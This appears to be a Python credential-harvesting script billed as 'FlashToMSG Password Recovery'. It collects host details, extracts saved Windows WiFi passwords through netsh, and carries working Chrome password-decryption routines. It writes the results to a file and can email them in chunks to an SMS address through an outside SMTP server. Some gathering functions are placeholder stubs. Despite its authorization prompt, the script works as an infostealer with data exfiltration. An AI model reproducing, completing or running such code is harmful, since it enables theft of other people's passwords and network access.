import platform
import socket
import psutil
import smtplib
import os
import sqlite3
import subprocess
import re
import json
import keyring
import getpass
from email.mime.text import MIMEText
from datetime import timedelta
from Crypto.Cipher import AES
import base64

try:
    import win32crypt
except ImportError:
    pass


SMTP_SERVER = os.getenv("SMTP_SERVER", "smtp.gmail.com")
SMTP_PORT = int(os.getenv("SMTP_PORT", "465"))
SENDER_EMAIL = os.getenv("SENDER_EMAIL")
SENDER_PASSWORD = os.getenv("SENDER_PASSWORD")
RECIPIENT = os.getenv("RECIPIENT_NUMBER")

def get_system_info():
    """Get basic system information"""
    info = {
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "OS": platform.system() + " " + platform.release(),
        "CPU": platform.processor(),
        "Memory": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
        "Uptime": str(timedelta(seconds=int(psutil.boot_time()))),
    }
    return "\n".join([f"{k}: {v}" for k, v in info.items()])

def get_wifi_passwords():
    """Retrieve WiFi passwords with platform-specific methods"""
    try:
        system = platform.system()
        if system == 'Windows':
            return _get_wifi_windows()
        elif system == 'Linux':
            return _get_wifi_linux()
        elif system == 'Darwin':
            return _get_wifi_macos()
        return f"WiFi: {system} not supported"
    except Exception as e:
        return f"WiFi Error: {str(e)}"

def _get_wifi_windows():
    """Windows WiFi password extraction"""
    profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True)
    profile_names = re.findall(r': (.*)', profiles)
    results = ""
    for name in profile_names:
        try:
            profile_info = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'],
                text=True
            )
            password_match = re.search(r'Key Content\s*: (.*)', profile_info)
            if password_match:
                results += f"WiFi: {name:<30}| Password: {password_match.group(1)}\n"
        except subprocess.CalledProcessError:
            continue
    return results

def _get_wifi_linux():
    """Linux WiFi password extraction"""
 
    return "Linux WiFi implementation"

def _get_wifi_macos():
    """macOS WiFi password extraction"""

    return "macOS WiFi implementation"

def decrypt_chrome_password(encrypted_password, key=None):
    """Decrypt Chrome passwords with platform-specific methods"""
    try:
        system = platform.system()
        if system == 'Windows':
            return _decrypt_chrome_windows(encrypted_password)
        elif system in ['Linux', 'Darwin'] and key:
            return _decrypt_chrome_unix(encrypted_password, key)
        return "Decryption not implemented"
    except:
        return "Decryption Failed"

def _decrypt_chrome_windows(encrypted_password):
    """Windows Chrome password decryption"""
    return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()

def _decrypt_chrome_unix(encrypted_password, key):
    """Linux/macOS Chrome password decryption"""
    try:
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return "Decryption Failed (AES)"

def get_chrome_passwords():
    """Retrieve Chrome passwords with platform-specific paths"""
    try:
        system = platform.system()
        if system == 'Windows':
            return _get_chrome_windows()
        elif system == 'Linux':
            return _get_chrome_linux()
        elif system == 'Darwin':
            return _get_chrome_macos()
        return f"Chrome: {system} not supported"
    except Exception as e:
        return f"Chrome Error: {str(e)}"

def _get_chrome_windows():
    """Windows Chrome password extraction"""

    return "Windows Chrome passwords"

def _get_chrome_linux():
    """Linux Chrome password extraction"""
    
    return "Linux Chrome passwords"

def _get_chrome_macos():
    """macOS Chrome password extraction"""
   
    return "macOS Chrome passwords"

def get_system_passwords():
    """Compile password report from all sources"""
    password_data = "\n[PASSWORD REPORT]\n"
    password_data += "\n[WIFI PASSWORDS]\n" + get_wifi_passwords()
    password_data += "\n[CHROME PASSWORDS]\n" + get_chrome_passwords()
    return password_data

def send_sms_via_email(full_data):
    """Send report via email with configuration checks"""
    if not all([SENDER_EMAIL, SENDER_PASSWORD, RECIPIENT]):
        print("Email configuration missing. Set environment variables:")
        print("SENDER_EMAIL, SENDER_PASSWORD, RECIPIENT_NUMBER")
        return

    try:
      
        chunks = [full_data[i:i+150] for i in range(0, len(full_data), 150)]
        
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            for i, chunk in enumerate(chunks, 1):
                msg = MIMEText(chunk)
                msg["From"] = SENDER_EMAIL
                msg["To"] = RECIPIENT
                msg["Subject"] = f"SysReport Part {i}/{len(chunks)}"
                server.sendmail(SENDER_EMAIL, RECIPIENT, msg.as_string())
        print(f"Successfully sent {len(chunks)} message parts.")
    except Exception as e:
        print(f"Failed to send: {e}")

def main():
    """Main execution with user confirmation"""
    print("=== FlashToMSG Password Recovery ===")
    print("WARNING: Only use on devices you own!")
    
    if input("Confirm you have proper authorization (y/n): ").lower() != 'y':
        print("Aborted - legal requirement")
        return

    data = get_system_info()
    password_data = get_system_passwords()
    full_report = data + password_data
    

    with open("system_report.txt", "w") as f:
        f.write(full_report)
    print("Full report saved to system_report.txt")
    
    # Optional email sending
    if input("Send report via email? (y/n): ").lower() == 'y':
        send_sms_via_email(full_report)

if __name__ == "__main__":
    main()